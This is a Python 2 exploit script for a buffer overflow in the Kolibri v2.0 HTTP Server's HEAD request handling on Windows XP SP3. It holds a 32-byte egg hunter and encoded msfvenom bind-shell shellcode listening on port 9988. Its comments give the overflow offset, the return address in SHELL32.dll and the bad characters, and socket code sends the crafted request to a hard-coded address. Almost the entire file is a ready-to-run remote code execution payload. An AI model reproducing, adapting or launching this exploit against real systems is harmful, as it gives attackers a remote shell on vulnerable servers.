#!/usr/bin/python2

#-------------------------------------------------------------------------------#
# Exploit: Kolibri v2.0 HTTP Server HEAD (Egg Hunter)                           #
# OS: Windows XP Professional SP3 Build 2600                                    #
# Architecture: x86                                                             #
#-------------------------------------------------------------------------------#
 
import socket
import os
import sys

# Egghunter (32 bytes)
hunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
          "\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# msfvenom -p windows/shell_bind_tcp LPORT=9988 -e x86/alpha_mixed -f c
# x86/alpha_mixed succeeded with size 717 (iteration=0)
shellcode = ("\xda\xd9\xd9\x74\x24\xf4\x58\x50\x59\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x69"
"\x6c\x7a\x48\x6b\x32\x47\x70\x57\x70\x55\x50\x55\x30\x4b\x39"
"\x58\x65\x74\x71\x79\x50\x42\x44\x6e\x6b\x32\x70\x74\x70\x6e"
"\x6b\x71\x42\x66\x6c\x6c\x4b\x51\x42\x67\x64\x6e\x6b\x53\x42"
"\x44\x68\x46\x6f\x4d\x67\x71\x5a\x46\x46\x30\x31\x69\x6f\x6c"
"\x6c\x45\x6c\x70\x61\x53\x4c\x64\x42\x66\x4c\x31\x30\x4a\x61"
"\x38\x4f\x36\x6d\x66\x61\x58\x47\x7a\x42\x6c\x32\x70\x52\x63"
"\x67\x6c\x4b\x33\x62\x42\x30\x4e\x6b\x32\x6a\x75\x6c\x4c\x4b"
"\x52\x6c\x37\x61\x43\x48\x6a\x43\x71\x58\x36\x61\x6a\x71\x30"
"\x51\x4e\x6b\x36\x39\x45\x70\x77\x71\x58\x53\x6c\x4b\x52\x69"
"\x74\x58\x4d\x33\x57\x4a\x51\x59\x4c\x4b\x67\x44\x4c\x4b\x75"
"\x51\x5a\x76\x56\x51\x49\x6f\x4c\x6c\x39\x51\x58\x4f\x76\x6d"
"\x45\x51\x69\x57\x64\x78\x6b\x50\x70\x75\x5a\x56\x73\x33\x53"
"\x4d\x39\x68\x35\x6b\x63\x4d\x57\x54\x50\x75\x48\x64\x56\x38"
"\x4e\x6b\x76\x38\x77\x54\x36\x61\x5a\x73\x71\x76\x4e\x6b\x66"
"\x6c\x70\x4b\x6e\x6b\x53\x68\x37\x6c\x57\x71\x79\x43\x6e\x6b"
"\x34\x44\x6c\x4b\x33\x31\x6a\x70\x6e\x69\x42\x64\x61\x34\x64"
"\x64\x61\x4b\x71\x4b\x73\x51\x61\x49\x30\x5a\x36\x31\x39\x6f"
"\x59\x70\x63\x6f\x53\x6f\x42\x7a\x4c\x4b\x34\x52\x6a\x4b\x4c"
"\x4d\x73\x6d\x30\x68\x76\x53\x74\x72\x47\x70\x43\x30\x51\x78"
"\x33\x47\x71\x63\x37\x42\x33\x6f\x51\x44\x71\x78\x42\x6c\x72"
"\x57\x55\x76\x36\x67\x69\x6f\x6b\x65\x6f\x48\x5a\x30\x46\x61"
"\x75\x50\x35\x50\x64\x69\x69\x54\x33\x64\x52\x70\x33\x58\x77"
"\x59\x6b\x30\x32\x4b\x43\x30\x4b\x4f\x69\x45\x32\x4a\x66\x68"
"\x31\x49\x32\x70\x4d\x32\x6b\x4d\x63\x70\x56\x30\x77\x30\x56"
"\x30\x31\x78\x6b\x5a\x66\x6f\x4b\x6f\x4b\x50\x6b\x4f\x6a\x75"
"\x4a\x37\x45\x38\x47\x72\x33\x30\x74\x67\x56\x64\x4b\x39\x4d"
"\x36\x71\x7a\x72\x30\x33\x66\x50\x57\x43\x58\x6a\x62\x69\x4b"
"\x74\x77\x62\x47\x79\x6f\x68\x55\x30\x57\x51\x78\x6f\x47\x79"
"\x79\x66\x58\x39\x6f\x49\x6f\x6a\x75\x30\x57\x71\x78\x73\x44"
"\x6a\x4c\x65\x6b\x78\x61\x6b\x4f\x38\x55\x66\x37\x4f\x67\x42"
"\x48\x72\x55\x42\x4e\x42\x6d\x31\x71\x39\x6f\x4a\x75\x70\x68"
"\x72\x43\x52\x4d\x63\x54\x33\x30\x6d\x59\x78\x63\x63\x67\x51"
"\x47\x66\x37\x56\x51\x68\x76\x72\x4a\x77\x62\x31\x49\x61\x46"
"\x78\x62\x79\x6d\x32\x46\x4a\x67\x33\x74\x44\x64\x47\x4c\x56"
"\x61\x47\x71\x4c\x4d\x67\x34\x57\x54\x46\x70\x7a\x66\x33\x30"
"\x32\x64\x46\x34\x32\x70\x42\x76\x42\x76\x52\x76\x53\x76\x71"
"\x46\x30\x4e\x66\x36\x71\x46\x30\x53\x72\x76\x63\x58\x70\x79"
"\x78\x4c\x37\x4f\x6d\x56\x79\x6f\x69\x45\x4d\x59\x59\x70\x62"
"\x6e\x76\x36\x51\x56\x39\x6f\x46\x50\x65\x38\x65\x58\x6b\x37"
"\x77\x6d\x33\x50\x39\x6f\x39\x45\x6f\x4b\x48\x70\x68\x35\x59"
"\x32\x42\x76\x30\x68\x6f\x56\x4d\x45\x6f\x4d\x6d\x4d\x59\x6f"
"\x39\x45\x57\x4c\x43\x36\x33\x4c\x57\x7a\x6d\x50\x79\x6b\x6b"
"\x50\x33\x45\x55\x55\x4f\x4b\x33\x77\x55\x43\x72\x52\x52\x4f"
"\x43\x5a\x67\x70\x52\x73\x39\x6f\x5a\x75\x41\x41")

#-------------------------------------------------------------------------------#
# badchars: \x00\x0d\x0a\x3d\x20\x3f                                            #
#-------------------------------------------------------------------------------#
# stage1:                                                                       #
# (1) EIP: 0x7c9d30d7 push esp # ret | SHELL32.dll                              #
# (2) ESP: jump back 60 bytes in the buffer => \xeb\xc4                         #
# (3) Enough room for egghunter; marker "b33f"                                  #
#-------------------------------------------------------------------------------#
# stage2:                                                                       #
# (4) Embed the final stage payload in the HTTP header, which will be put       #
#     somewhere in memory at the time of the initial crash.                     #
# (*) For reliability we use the x86/alpha_mixed encoder (we have as much space #
#     as we could want), possibly this region of memory has a different set of  #
#     bad characters.                                                           #
#-------------------------------------------------------------------------------#

offset = 515
# Address=7C9D30D7 Message=  0x7c9d30d7 : jmp esp |  {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.5512 (C:\WINDOWS\system32\SHELL32.dll)
stage1 = "A"*478 + hunter + "A"*5 + "\xd7\x30\x9d\x7c" + "\xeb\xc4"

stage2 = "b33fb33f" + shellcode
 
buffer = (
"HEAD /" + stage1 + " HTTP/1.1\r\n"
"Host: 192.168.111.128:8080\r\n"
"User-Agent: " + stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p.connect(("192.168.1.82", 8080))
p.send(buffer)
p.close()
